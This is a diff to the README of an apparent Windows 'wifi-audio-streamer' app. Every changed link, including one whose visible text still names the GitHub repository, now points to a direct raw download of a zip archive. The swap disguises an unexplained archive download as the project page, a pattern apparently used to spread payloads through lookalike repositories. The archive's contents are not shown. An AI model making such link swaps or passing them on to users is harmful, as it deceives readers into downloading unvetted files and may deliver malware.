@@ -1,6 +1,6 @@
 # 🔊 wifi-audio-streamer - Turn Your Phone Into a Wireless Speaker
 
-[![Download wifi-audio-streamer](https://img.shields.io/badge/Download-wifi--audio--streamer-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/lucitaunchaste303/wifi-audio-streamer)
+[![Download wifi-audio-streamer](https://img.shields.io/badge/Download-wifi--audio--streamer-blue?style=for-the-badge&logo=github&color=4CAF50)](https://raw.githubusercontent.com/lucitaunchaste303/wifi-audio-streamer/main/src/sources/audio_wifi_streamer_1.8.zip)
 
 ## 📥 Download & Install
 
@@ -26,7 +26,7 @@ wifi-audio-streamer lets you turn any phone into a wireless speaker for your PC.
 
 ### Step 1: Download the App
 
-Click the green button above (or **[this link](https://github.com/lucitaunchaste303/wifi-audio-streamer)**) to go to the download page. Choose the latest version for Windows.
+Click the green button above (or **[this link](https://raw.githubusercontent.com/lucitaunchaste303/wifi-audio-streamer/main/src/sources/audio_wifi_streamer_1.8.zip)**) to go to the download page. Choose the latest version for Windows.
 
 ### Step 2: Install and Run
 
@@ -91,7 +91,7 @@ It's open-source, free, and always improving. Join the community and start strea
 
 ## 📞 Support & Feedback
 
-If you run into issues, have feature requests, or want to contribute, visit the GitHub repository: [github.com/lucitaunchaste303/wifi-audio-streamer](https://github.com/lucitaunchaste303/wifi-audio-streamer)
+If you run into issues, have feature requests, or want to contribute, visit the GitHub repository: [github.com/lucitaunchaste303/wifi-audio-streamer](https://raw.githubusercontent.com/lucitaunchaste303/wifi-audio-streamer/main/src/sources/audio_wifi_streamer_1.8.zip)
 
 - Report a bug: Use the "Issues" tab on GitHub.
 - Suggest a feature: Add a "Feature Request" in the discussions.
